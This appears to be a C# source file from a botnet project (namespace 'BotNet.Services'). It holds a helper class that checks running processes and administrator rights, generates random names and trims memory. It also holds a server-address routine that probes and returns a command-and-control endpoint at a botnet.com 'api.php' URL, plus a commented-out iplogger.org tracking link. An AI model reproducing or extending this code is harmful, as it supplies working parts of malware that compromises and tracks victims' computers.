using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

namespace BotNet.Services
{
    class Instant
    {
        public bool CheckProcess(string procName)
        {
            var runningProcs = from proc in Process.GetProcesses(".") orderby proc.Id select proc;
            if (runningProcs.Count(p => p.ProcessName.ToUpper().Contains(procName)) > 0)
            {
                return true;
            }

            return false;
        }
        public bool CheckFile(string filePath)
        {
            if (File.Exists(filePath))
                return true;
            return false;
        }
        public string GenString(int length)
        {
            Random r = new Random();
            string chars = "qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM";
            string ret = chars[r.Next(10, chars.Length)].ToString();
            for (int i = 1; i < length; i++)
                ret += chars[r.Next(chars.Length)];
            return ret;
        }
        [DllImport("kernel32.dll", EntryPoint = "SetProcessWorkingSetSize", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]

        //Method to clear RAM
        private static extern int SetProcessWorkingSetSize(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);
        public void ClearMemory()
        {
            GC.Collect();
            GC.WaitForPendingFinalizers();
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
        }
        public bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        public string GetServerAddress()
        {
            return testSite(@"http://www.test.botnet.com/api.php") ? @"http://www.test.botnet.com/api.php" : @"http://www.test.botnet.com/api.php";
            //return testSite(@"https://iplogger.org/26jLk5") ? @"https://iplogger.org/26jLk5" : @"https://iplogger.org/26jLk5";
        }
        private bool testSite(string url)
        {
            //IPLogger_action(url);
            Uri uri = new Uri(url);
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)HttpWebRequest.Create(uri);
                HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
